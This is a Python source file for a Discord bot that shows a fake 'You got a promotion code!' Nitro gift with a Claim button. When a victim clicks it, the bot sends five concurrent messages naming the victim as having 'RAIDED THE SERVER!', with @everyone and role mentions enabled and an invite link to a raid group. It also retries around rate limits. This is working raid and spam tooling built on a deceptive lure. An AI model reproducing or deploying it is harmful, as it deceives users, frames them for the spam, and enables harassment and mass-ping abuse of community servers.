import asyncio
import aiohttp
import discord
import tomllib

with open("config.toml", "rb") as f:
    _config = tomllib.load(f)

ZNE_INVITE = _config.get("zne_invite", "https://discord.gg/RqTCnuyhGN")


_rate_limit_count = 0
_rate_limit_delay = 0.001


async def _send_message_http(session: aiohttp.ClientSession, application_id: int, interaction_token: str, content: str):
    global _rate_limit_count, _rate_limit_delay
    
    url = f"https://discord.com/api/v10/webhooks/{application_id}/{interaction_token}"
    payload = {"content": content, "allowed_mentions": {"parse": ["everyone", "users", "roles"]}}
    
    async with session.post(url, json=payload) as resp:
        if resp.status == 429:
            _rate_limit_count += 1
            if _rate_limit_count >= 10:
                _rate_limit_delay += 0.01
                _rate_limit_count = 0
            await asyncio.sleep(_rate_limit_delay)
            async with session.post(url, json=payload) as retry_resp:
                return retry_resp.status
        return resp.status


class FakeNitroView(discord.ui.LayoutView):
    container1 = discord.ui.Container(
        discord.ui.Section(
            discord.ui.TextDisplay(content="You got a promotion code!\n-# This gift link is a promotion code. \n-# Click the button below to claim it."),
            accessory=discord.ui.Thumbnail(
                media="https://cdn3.emoji.gg/emojis/7496-payments-nitro.gif",
            ),
        ),
        discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.primary,
                    label="Claim",
                    custom_id="fake_nitro_claim",
                ),
        ),
    )

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.data.get("custom_id") == "fake_nitro_claim":
            await interaction.response.defer()
            
            user_mention = interaction.user.mention
            
            app_id = interaction.client.application_id
            token = interaction.token
            content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE}"
            
            async with aiohttp.ClientSession() as session:
                tasks = [
                    _send_message_http(session, app_id, token, content)
                    for _ in range(5)
                ]
                await asyncio.gather(*tasks)
            
            return False
        return True